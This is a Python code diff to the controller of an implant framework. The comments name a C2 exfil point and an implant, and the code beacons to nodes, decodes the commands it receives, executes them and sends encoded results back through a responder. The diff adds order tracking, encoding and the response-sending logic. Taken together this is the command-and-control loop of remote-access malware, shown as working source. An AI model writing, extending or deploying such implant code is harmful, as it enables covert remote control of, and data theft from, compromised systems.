@@ -8,6 +8,8 @@ import inspect
 import sys
 import warnings
 from socket import error as socket_error
+from implant_modules.command_object import CommandObject
+from implant_modules.order import Order
 
 # TODO:
 #
@@ -15,6 +17,11 @@ from socket import error as socket_error
 # - Considering wrapping each node into a Node class upon initial import.
 # - Fix easy_import and abstract_builder so you can hand it a list of the modules for a package (beacons, commands, etc), since the import can receive a list. More efficient.
 # - Consider change command modules from {cmd:params} to (cmd, params) tuple. Better utilizes types to separate data. 
+# - more flexible designation of where to send teh results/responses
+# - Add behaviors as modules
+# - make teh sending of results/responses optional
+# - make teh results sending have an option of be dependant upon the command (i.e each command results can be sent somewhere different, or not at all, etc)
+# - Make the base.py global values available to the controller so they can be edited, etc. Do this in a pythonic manner with exporting/importing etc.
 
 PROMP_SEP = "->"
 PROMP_BASE = "[Controller"
@@ -25,6 +32,7 @@ DEC_PROMPT = PROMP_BASE + PROMP_SEP + 'Decoder' + PROMP_END
 CMD_PROMPT = PROMP_BASE + PROMP_SEP + 'Commander' + PROMP_END
 ENC_PROMPT = PROMP_BASE + PROMP_SEP + 'Encoder' + PROMP_END
 RESP_PROMPT = PROMP_BASE + PROMP_SEP + 'Responder' + PROMP_END
+COD_PROMPT = None
 
 BEACON_TYPE_IND = 0
 PARAMS_IND = 1
@@ -33,10 +41,12 @@ BEACON_PKG = MODULE_PATH + '.' + 'beacons'
 COMMAND_PKG = MODULE_PATH + '.' +'commands'
 DECODER_PKG = MODULE_PATH + '.' +'codecs'
 ENCODER_PKG = MODULE_PATH + '.' + 'codecs'
-RESPONDER_PKG = MODULE_PATH + '.' + 'responders'
+RESPONDER_PKG = MODULE_PATH + '.' + 'beacons'
 
 CMD_SUCC_KEY = 'success'
 CMD_RES_KEY = 'results'
+CMD_NAME_KEY = 'command'
+CMD_ARGS_KEY = 'args'
 NODE_IP_KEY = 'node'
 NODE_PORT_KEY = 'port'
 
@@ -49,9 +59,6 @@ class Controller:
     response_map = {}
     
     def __init__(self, beacons, commands, decoders, encoders, responders):
-        
-        if len(encoders) == 0:
-            encoders = reversed(decoders)
         
         self.build_handlers(beacons, commands, decoders, encoders, responders)
     
@@ -162,7 +169,15 @@ class Controller:
                 
                 if success:
                     print "%s Successfully retrieved data from %s:%s" % (BEAC_PROMPT, ip, port)
-                    return (success, response)
+                    order = Order()
+                    order.node = node
+                    order.node_ip = ip
+                    order.node_port = port
+                    order.node_type = beacon_type
+                    order.node_params = params
+                    order.raw_response = response
+                    
+                    return (success, order)
                 else:
                     # Will not all failures raise an exception? Perahsp this should be forced implementation by all Beaconers?
                     # print "%s Failed to retrieve data from %s:%s" % (BEAC_PROMPT, ip, port)
@@ -177,7 +192,7 @@ class Controller:
         except Exception,e :
             raise e
     
-    def recursive_decoder(self, decoder, encoded_data):
+    def recursive_decoder(self, decoder, encoded_data, full_body = False):
         
         decoded_data = []
         
@@ -185,20 +200,20 @@ class Controller:
         
         try:
             
-            if isinstance(encoded_data,basestring):
-                decoded_data.append(decoder.decode(encoded_data))
+            if isinstance(encoded_data,basestring) or full_body:
+                decoded_data.append(decoder(encoded_data))
                 #return success, decoded_data
             elif type(encoded_data) is dict:
                 
                     decoded_portion = {}
                     for encoded_key, encoded_value in encoded_data.items():
-                        decoded_key = decoder.decode(encoded_key)
+                        decoded_key = decoder(encoded_key)
                         
                         if type(encoded_value) is list or type(encoded_value) is dict:
                             success, data = self.recursive_decoder(decoder, encoded_value)
                             decoded_value = data
                         else:
-                            decoded_value = decoder.decode(encoded_value)
+                            decoded_value = decoder(encoded_value)
                         
                         decoded_portion[decoded_key] = decoded_value
 
@@ -216,7 +231,7 @@ class Controller:
                     
             else:
                 print type(encoded_data), encoded_data
-                print DEC_PROMPT + 'Data was not formatted as dict, list/tuple, string!'
+                print COD_PROMPT + 'Data was not formatted as dict, list/tuple, string!'
                 raise
             
             ## NOTE: If nested multiple commands breaks, this is likely the culprit
@@ -225,13 +240,14 @@ class Controller:
                 
         except Exception, e:
                 print e
-                print DEC_PROMPT + " Issue in %s decoder while trying to decode %s " % (decoder.name(), encoded_data)
+                print COD_PROMPT + " Issue in codec while trying to code %s" % (encoded_data)
                 return (False, None)
         
         return success, decoded_data
     
     def handle_decode(self, encoded_data):
         
+        COD_PROMPT = DEC_PROMPT
         print DEC_PROMPT + " decoding..."
         
         # while there is another decoder, run each item through the next decoder
@@ -239,7 +255,7 @@ class Controller:
         success = False
         for decoder in self.decoder_list:
             current_decoder = decoder()
-            success, data = self.recursive_decoder(current_decoder, data)
+            success, data = self.recursive_decoder(current_decoder.decode, data)
             if not success:
                 break
             print DEC_PROMPT + "%s decoded to '%s'" % ( current_decoder.name(),data)
@@ -254,15 +270,20 @@ class Controller:
         try:
 
             if type_check is dict:
+                cmd_obj = None
+                args = None
                 for cmd, params in command.items():
                     cmd_class = self.command_map.get(cmd)
                     cmd_obj = cmd_class()
+                    args = params
                     print CMD_PROMPT + " Executing: %s" % (cmd_obj.name())
                     success, results = cmd_obj.execute(params)
     
                 cmd_results = {}
                 cmd_results[CMD_SUCC_KEY] = success
                 cmd_results[CMD_RES_KEY] = results
+                cmd_results[CMD_NAME_KEY] = cmd_obj.name()
+                cmd_results[CMD_ARGS_KEY] = args 
                 agg_results.append(cmd_results)
 
             elif type_check is list:
@@ -300,53 +321,91 @@ class Controller:
 
     
     def handle_encode(self, results):
+        
+        COD_PROMPT = ENC_PROMPT
         print ENC_PROMPT + " encoding results..."
-        pass
+        
+        # while there is another decoder, run each item through the next decoder
+        data = results
+        success = False
+        for encoder in self.encoder_list:
+            current_encoder = encoder()
+            full_body = getattr(current_encoder,'full_body_encode',False)
+            success, data = self.recursive_decoder(current_encoder.encode, data, full_body)
+            if not success:
+                break
+            print ENC_PROMPT + "%s encoded to '%s'" % ( current_encoder.name(),data)
+        return success, data
+        
     
-    def handle_response(self, encoded_results):
-        print RESP_PROMPT + " sending results..."
-        pass
+    def handle_response(self, order):
+        print RESP_PROMPT + " sending results of order %s..." % (order.uuid)
+        node = order.node
+        responder_type = node[BEACON_TYPE_IND]
+        params = node[PARAMS_IND]
+                
+        ip = params.get(NODE_IP_KEY)
+        port = params.get(NODE_PORT_KEY)
+        
+        responder_class = self.response_map.get(responder_type) # get this from the beacon map based on beacon type
+        responder = responder_class() # instantiate the object
+        try:
+            success = responder.send_response(params, order.response)
+        except Exception, e:
+            print "%s Error connecting to %s:%s (%s)" % (RESP_PROMPT, ip, port, e)
+            success = False
+            
+        return success
+        
     
     def handle(self, nodes):
         
+        success = False
+        
         try:
-            # Send command to beacon handler
-            success, encoded_data = self.handle_beacon(nodes)
+            # Attempt to beacon. Returns an Order object or None.
+            success, order = self.handle_beacon(nodes)
             
             # Send response to decoders
             if success:
-                success, decoded_data = self.handle_decode(encoded_data)
+                success, decoded_data = self.handle_decode(order.raw_response)
             else:
                 return False 
             
             # Process command
             if success:
+                #TODO: Here we should turn tuples, strings, dicts and lists into CommandObjects. Then add these CommandObjects to the Order. 
+                # then hand the Order to the command handler, from there it should
+                order.commands = decoded_data
                 success, results = self.handle_command(decoded_data)
+                order.results = results
             else:
                 return False
             
             # encode response here
             if success:
                 success, encoded_results = self.handle_encode(results)
+                order.response = encoded_results
             else:
                 return False
             
             # Send response
             if success:
-                success = self.handle_response(encoded_results)
+                success = self.handle_response(order)
             else:
                 return False
-            
-        
         except Exception, e:
             # Here consider sending back a message to the C2 exfil point, letting them know why the implant died
             # if so, replace the return statements with raise statements and define appropriate exceptions with mesages
-            raise e
-            
+            print "%s Exception: %s" % ( BASIC_PROMPT, e)
+            return False
+
+        return True        
     
     def beacon(self, nodes):
         # facade
         result = self.handle(nodes)
-        print "%s Beaconing iteration %s" % (BASIC_PROMPT,("FAILED", "SUCCEEDED")[result]) 
+        print "%s Beaconing iteration %s" % (BASIC_PROMPT,("FAILED", "SUCCEEDED")[result])
+        return result
     
     
